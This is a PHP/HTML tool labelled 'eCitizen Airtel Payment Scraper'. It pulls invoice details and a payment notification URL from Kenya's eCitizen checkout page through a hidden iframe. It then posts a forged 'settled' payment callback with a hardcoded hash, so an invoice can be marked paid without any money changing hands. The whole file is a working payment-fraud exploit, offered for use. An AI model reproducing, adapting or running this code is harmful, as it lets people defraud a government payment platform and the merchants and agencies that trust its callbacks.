<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['notification_submit'])) {
    $notification_url = $_POST['notification_url'];
    $amount = $_POST['amount'];
    $bill_ref = $_POST['bill_ref'];

    $payload = [
        "status" => "settled",
        "secure_hash" => "MzA5YzdkODFmZTdiM2E2MmU0NDJjNzZkN2IxOTAxMzkxZjUzNTgyNTU0NjE1MDE3Y2FjNDVkYmUyNDE5ZTJjNA==",
        "phone_number" => "254700000000",
        "payment_reference" => [
            [
                "payment_reference" => "",
                "payment_date" => date(DATE_ATOM),
                "inserted_at" => date(DATE_ATOM),
                "currency" => "KES",
                "amount" => $amount
            ]
        ],
        "payment_date" => date(DATE_ATOM),
        "payment_channel" => "MPESA",
        "last_payment_amount" => "0",
        "invoice_number" => $bill_ref,
        "invoice_amount" => $amount . ".00",
        "currency" => "KES",
        "client_invoice_ref" => $bill_ref,
        "amount_paid" => $amount
    ];

    $ch = curl_init($notification_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    $response = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eCitizen Payment Scraper</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        #loader { display: none; }
        .hidden { display: none; }
        .alert-box { margin-top: 20px; }
    </style>
</head>
<body class="bg-light">
    <div class="container py-5">
        <h2 class="mb-4 text-center">eCitizen Airtel Payment Scraper</h2>
        <form id="codeForm" class="mb-4">
            <div class="input-group">
                <input type="text" class="form-control" id="codeInput" placeholder="Enter Code Number" required>
                <button class="btn btn-primary" type="submit">Fetch Invoice</button>
            </div>
        </form>

        <div id="loader" class="text-center mb-4">
            <div class="spinner-border text-primary" role="status">
                <span class="visually-hidden">Loading...</span>
            </div>
        </div>

        <form id="formA" class="hidden" method="POST">
            <h5 class="mb-3">Form A - Airtel Payment Details</h5>
            <input type="hidden" name="notification_url">
            <input type="hidden" name="amount">
            <input type="hidden" name="bill_ref">
            <input type="hidden" name="invoice_no">
            <button type="submit" name="notification_submit" class="btn btn-success">Submit Notification</button>
        </form>

        <div id="result" class="alert-box">
            <?php if (isset($http_status)): ?>
                <div class="alert <?php echo $http_status === 200 ? 'alert-success' : 'alert-danger'; ?>">
                    <strong><?php echo $http_status === 200 ? 'Success' : 'Failure'; ?>:</strong>
                    <?php echo htmlspecialchars($response); ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <script>
        document.getElementById('codeForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            const code = document.getElementById('codeInput').value;
            const url = `https://payments.ecitizen.go.ke/api/invoice/checkout/${code}?callback_url=https://bomayangu.go.ke/payments#`;

            document.getElementById('loader').style.display = 'block';
            document.getElementById('formA').classList.add('hidden');
            document.getElementById('result').innerHTML = '';

            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            iframe.src = url;

            iframe.onload = function () {
                try {
                    const airtel = iframe.contentDocument.querySelector('airtel-v3');
                    if (!airtel) throw new Error('Element not found');

                    document.querySelector('#formA [name=amount]').value = airtel.getAttribute('amount_net');
                    document.querySelector('#formA [name=bill_ref]').value = airtel.getAttribute('bill_ref');
                    document.querySelector('#formA [name=invoice_no]').value = airtel.getAttribute('invoice_no');
                    document.querySelector('#formA [name=notification_url]').value = airtel.getAttribute('notification_url');

                    document.getElementById('formA').classList.remove('hidden');
                } catch (err) {
                    document.getElementById('result').innerHTML = `<div class="alert alert-danger">Failed to extract data. Check if code is correct.</div>`;
                } finally {
                    document.getElementById('loader').style.display = 'none';
                    document.body.removeChild(iframe);
                }
            };
        });
    </script>
</body>
</html>
